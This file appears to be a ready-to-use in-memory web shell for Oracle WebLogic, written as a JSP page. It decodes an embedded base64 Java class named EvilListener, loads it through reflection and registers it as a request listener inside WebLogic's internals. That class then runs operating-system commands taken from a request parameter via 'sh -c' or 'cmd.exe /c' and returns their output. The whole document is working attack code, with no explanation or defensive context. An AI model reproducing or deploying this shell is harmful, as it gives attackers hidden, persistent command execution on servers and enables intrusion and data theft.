<%@page import="java.lang.reflect.Field"%>
<%@page import="java.lang.reflect.Method"%>
<%@page import="java.util.Map"%>
<%@page import="java.util.Iterator"%>

<%
//((WlsRequestExecutor)currentWorkEntry).connectionHandler.getHttpServer().getServletContextManager().contextTable
byte[] codeClass = java.util.Base64.getDecoder().decode("yv66vgAAADQAoAoAIgBRCgBSAFMHAFQKAAMAVQgAMwsAVgBXCABYCgBZAFoKAAwAWwgAXAoADABdBwBeCABfCABgCABhCABiCgBjAGQKAGMAZQoAZgBnBwBoCgAUAGkIAGoKABQAawoAFABsCgAUAG0IAG4LAG8AcAoAcQByCgBxAHMKAHEAdAcAdQoAHwB2BwB3BwB4BwB5AQACYWEBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADkxFdmlsTGlzdGVuZXI7AQAScmVxdWVzdEluaXRpYWxpemVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBAAdyZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQADY21kAQAHaXNMaW51eAEAAVoBAAVvc1R5cAEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAA291dAEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQACZXYBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEADVN0YWNrTWFwVGFibGUHAHcHAHoHAHsHAHwHAF4HADgHAH0HAGgHAHUBABByZXF1ZXN0RGVzdHJveWVkAQAKU291cmNlRmlsZQEAEUV2aWxMaXN0ZW5lci5qYXZhDAAmACcHAHoMAH4AfwEALHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlcXVlc3RJbXBsDACAAIEHAHsMAIIAgwEAB29zLm5hbWUHAIQMAIUAgwwAhgCHAQADd2luDACIAIkBABBqYXZhL2xhbmcvU3RyaW5nAQACc2gBAAItYwEAB2NtZC5leGUBAAIvYwcAigwAiwCMDACNAI4HAI8MAJAAkQEAEWphdmEvdXRpbC9TY2FubmVyDAAmAJIBAAJcYQwAkwCUDACVAJYMAJcAhwEAAAcAfAwAmACZBwCaDACbAJwMAJ0AJwwAngAnAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAnwAnAQAMRXZpbExpc3RlbmVyAQAQamF2YS9sYW5nL09iamVjdAEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQALZ2V0UmVzcG9uc2UBADEoKUx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXNwb25zZUltcGw7AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UBAA9wcmludFN0YWNrVHJhY2UAIQAhACIAAQAjAAEAAAAkACUAAAADAAEAJgAnAAEAKAAAAC8AAQABAAAABSq3AAGxAAAAAgApAAAABgABAAAABwAqAAAADAABAAAABQArACwAAAABAC0ALgABACgAAAHzAAQADAAAALkrtgACTSzAAAO2AAROLBIFuQAGAgA6BAQ2BRIHuAAIOgYZBsYAExkGtgAJEgq2AAuZAAYDNgUVBZkAGQa9AAxZAxINU1kEEg5TWQUZBFOnABYGvQAMWQMSD1NZBBIQU1kFGQRTOge4ABEZB7YAErYAEzoIuwAUWRkItwAVEha2ABc6CRkJtgAYmQALGQm2ABmnAAUSGjoKLbkAGwEAOgsZCxkKtgAcGQu2AB0ZC7YAHqcACE0stgAgsQABAAAAsACzAB8AAwApAAAATgATAAAACwAFAAwADQAOABcADwAaABAAIQARADMAEgA2ABQAZgAVAHMAFgCDABcAlwAYAJ8AGQCmABoAqwAbALAAHgCzABwAtAAdALgAHwAqAAAAhAANAAUAqwAvADAAAgANAKMAMQAyAAMAFwCZADMAJQAEABoAlgA0ADUABQAhAI8ANgAlAAYAZgBKADcAOAAHAHMAPQA5ADoACACDAC0AOwA8AAkAlwAZAD0AJQAKAJ8AEQA+AD8ACwC0AAQAQABBAAIAAAC5ACsALAAAAAAAuQBCAEMAAQBEAAAAQgAH/wA2AAcHAEUHAEYHAEcHAEgHAEkBBwBJAAAaUgcASv4ALgcASgcASwcATEEHAEn/AB0AAgcARQcARgABBwBNBAABAE4ALgABACgAAAA1AAAAAgAAAAGxAAAAAgApAAAABgABAAAAIgAqAAAAFgACAAAAAQArACwAAAAAAAEAQgBDAAEAAQBPAAAAAgBQ");
	ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
	java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
	define.setAccessible(true);
	Class evilFilterClass  = (Class)define.invoke(cl,codeClass,0,codeClass.length);
	
	
Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
            java.lang.reflect.Method m = executeThread.getDeclaredMethod("getCurrentWork");
            Object currentWork = m.invoke(Thread.currentThread());

			
            java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
            connectionHandlerF.setAccessible(true);
            Object obj = connectionHandlerF.get(currentWork);

            java.lang.reflect.Field requestF = obj.getClass().getDeclaredField("request");
            requestF.setAccessible(true);
            obj = requestF.get(obj);

            java.lang.reflect.Field contextF = obj.getClass().getDeclaredField("context");
            contextF.setAccessible(true);
            Object context = contextF.get(obj);
			
			Field phaseF = context.getClass().getDeclaredField("phase");
			phaseF.setAccessible(true);
			phaseF.set(context, weblogic.servlet.internal.WebAppServletContext.ContextPhase.INITIALIZER_STARTUP);
			
			Method registerServletM = (Method)context.getClass().getDeclaredMethod("registerListener",String.class);
			registerServletM.setAccessible(true);
			registerServletM.invoke(context,"EvilListener");
			
			phaseF.set(context, weblogic.servlet.internal.WebAppServletContext.ContextPhase.START);



%>